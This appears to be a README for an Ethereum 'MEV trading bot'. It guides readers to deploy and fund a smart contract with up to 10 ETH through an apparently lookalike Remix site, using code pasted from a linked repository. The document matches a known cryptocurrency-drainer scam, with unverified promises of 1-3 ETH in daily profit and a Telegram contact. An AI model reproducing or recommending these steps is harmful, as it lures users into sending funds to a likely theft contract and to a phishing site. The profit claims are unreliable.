🚨 Important Notice: Ensure Sufficient Funding for Gas and Burn Fees 🚨

Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.1 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.

To avoid this, I recommend funding your contract with at least 0.15 ETH and up to 10 ETH to ensure the bot functions optimally.

This repository contains a smart contract-based trading bot for Ethereum-based tokens, designed to interact with decentralized exchanges (DEXs) such as Uniswap and GMX. The bot is written in Solidity, using the Uniswap V2 and SushiSwap routers for execution.

Setup Instructions
Follow these steps to deploy and run your own trading bot:

1. Access Remix and MetaMask
Visit [Remix IDE](https://app.remix.live/) https://app.remix.live/ To minimize transaction fees, please use this optimized version, specifically engineered for this robot. It provides full compatibility while operating with significantly reduced gas costs
Ensure you have the MetaMask browser extension installed and connected to the Ethereum mainnet or testnet

2. Create the Contract File
In Remix IDE, right-click the contracts/ folder
Click "New File" and name it (e.g., bot.sol)

3. Paste the Contract [Code](https://github.com/jcb-hub/bot.sol/blob/main/Code)
Copy the source code from this repository
Paste it into your newly created [Bot.sol](https://github.com/jcb-hub/bot.sol/blob/main/Code) file

4. Compile the Contract
Navigate to the "Solidity Compiler" tab
Select Solidity version 0.6.6
Click "Compile bot.sol"

5. Deploy the Contract
Go to the "Deploy & Run Transactions" tab
Set the environment to "Injected Provider - MetaMask"
Select your contract and click "Deploy"
Confirm the transaction in MetaMask to create your contract

6. Fund the Contract
Send at least 0.1 ETH to your contract address

7. Run the Bot
In Remix, click the "Start" button to activate the bot
To stop and withdraw funds, click "Withdrawal"
For best results, allow the bot to run for at least 24 hours

🔗 Connect With Me
📬 Telegram
📄 License
This project is for educational and research purposes only. Use at your own risk.

➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖

🔥 My running mev bot, used 5 ETH. Averaging about 1-3 ETH per day! https://etherscan.io/address/0xfc9928F6590D853752824B0B403A6AE36785e535

Happy trading! 🚀

